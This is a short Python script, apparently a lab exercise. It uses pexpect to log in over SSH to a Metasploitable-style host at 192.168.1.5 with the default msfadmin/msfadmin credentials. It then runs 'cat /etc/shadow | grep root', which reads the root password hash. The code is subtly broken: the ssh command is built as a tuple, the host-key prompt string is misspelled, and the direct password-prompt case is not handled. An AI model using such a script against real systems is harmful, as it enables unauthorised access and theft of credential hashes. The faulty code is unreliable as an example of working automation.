#!/usr/bin/python

import pexpect		# pexpect - it will allow some of the process in ssh login 





PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child,command):
	child.sendline(command)
	child.expect(PROMPT)	# wait till prompt is expected
	print(child.before)	# output of the command is printed



def connect(user,host,password):
	ssh_newkey = 'Are you sure you want to continuew connecting'
	connStr = 'ssh', user , '@', host	# ssh msfadmin@192.168.1.5
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:' ])
	if ret == 0:
		print("error connecting")
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:' ])
		if ret == 0:
			print('error connecting')
			return
		child.sendline(password)
		child.expect(PROMPT)
		return child


def main():
	host = '192.168.1.5'	# try to take input
	user = 'msfadmin'	# we can use input take the input
	password = 'msfadmin'
	child = connect(user,host,password)	# child stores ssh shell
	send_command(child, 'cat /etc/shadow | grep root;ps')	#root login required

main()
